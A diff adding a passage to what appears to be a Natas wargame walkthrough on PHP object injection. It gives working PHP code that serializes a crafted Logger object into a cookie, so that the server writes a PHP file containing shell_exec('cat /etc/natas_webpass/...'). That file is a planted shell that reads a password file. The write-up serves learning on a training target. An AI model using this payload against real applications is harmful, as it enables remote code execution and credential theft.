@@ -697,3 +697,85 @@ Now, let's get the password by reading the content of **etc/natas_webpass/natas2
 ```
 ![alt text](NatasScreenshots/26.3.png)
 Amazing!
+
+# Level 27
+
+This level takes two points coordinates and draw a line between them over a black 400x300 image. It uses a cookie called **drawing** to pass coordinates to it and this happens with **serialization** which means converting an array to a string. Since we are dealing with **serialization**, we can think of **PHP Object Injection** attack. Let's explain it.
+
+First, we need to know something about **unserilize()** function (which reverts the serialization and converts string to array): If the thing we are deserializing has the magic methods **__wakeup()** and  **__destruct()**, the first gets called when deserializing the object and then the second gets called. To perform the attack we need a class of an object that has one of these methods with code that can be used in our favor.
+
+Luckily, there is a class called **Logger** with a **__destruct()** method that can write something in some file. It is made in a way to append some hardcoded messages in a file located in **/tmp** and named after our **PHPSESSID**.
+
+As a strat, let's see how we can force the website to execute the **Logger**'s **__destruct()** method because there is no instantiation of that class anywhere in the code. Our way to that is the **drawing** cookie. Let's write a php code to generate the base64 encodation of the serialization of the instantiation of an object of that class. This phrase took an effort to write correctly, if it is correct, haha.
+
+```php
+<?php
+class Logger {}
+
+$logger = new Logger();
+$encoded = base64_encode(serialize($logger));
+echo $encoded;
+?>
+```
+
+Running this code will generate the content we need to replace **drawing** with and will let us force the **unserilize()** function to work with an instance of the **Logger** class. It will generate this string :
+```
+Tzo2OiJMb2dnZXIiOjA6e30=
+```
+Let's put it in **drawing** cookie and see what will happen.
+
+![alt text](NatasScreenshots/27.1.png)
+
+Well, new errors got shown up that are related to **fopen()** and **fwrite()** functions which are only used in **Logger** class. So we know for sure that an instance has been created and even got executed.
+
+Now let's hit to the next step where we make use of calling an instance of **Logger**. First, we need to change the file it is changing from **/tmp** to somewhere we can open from web gate. From our last attempt, it revealed the main folder that holds this level's web which is **/var/www/natas/natas26**. Besides, if we right-click the image and open in it a new webpage, we can see above in the url that it is in a folder named **/img**. So let's use **/var/www/natas/natas26/img** as a folder to hold our altered file. Make the file name unique to avoid conflict with other people following this approach. Also, let's inject some html code in the **$initMsg** and **$exitMsg** variables to test it.
+
+```php
+<?php
+class Logger {
+	private $logFile;
+    private $initMsg;
+    private $exitMsg;
+        
+	function __construct(){
+            $this->initMsg="#<h1>Hello World</h1>";
+            $this->exitMsg="<h1>Goodbye World</h1>";
+            $this->logFile = "/var/www/natas/natas26/img/njeeh.php";
+	}
+}
+
+$logger = new Logger();
+$encoded = base64_encode(serialize($logger));
+echo $encoded;
+?>
+```
+
+![alt text](NatasScreenshots/27.2.png)
+
+After changing the **drawing** cookie, refreshing and following the url of our created file, we can see that it outputs the exit message. It skipped the init one because as we mentioned the unserialization process calle only **_wakeup()** (which is not present) and **_destruct()**.
+
+Now, let's change the **$exitMsg** to a php payload that will echo the password for the next level
+
+```php
+<?php
+class Logger {
+	private $logFile;
+    private $initMsg;
+    private $exitMsg;
+        
+	function __construct(){
+            $this->initMsg="#<h1>Hello World</h1>";
+            $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27')?>";
+            $this->logFile = "/var/www/natas/natas26/img/njeeh.php";
+	}
+}
+
+$logger = new Logger();
+$encoded = base64_encode(serialize($logger));
+echo $encoded;
+?>
+```
+
+![alt text](NatasScreenshots/27.3.png)
+
+Perfect!
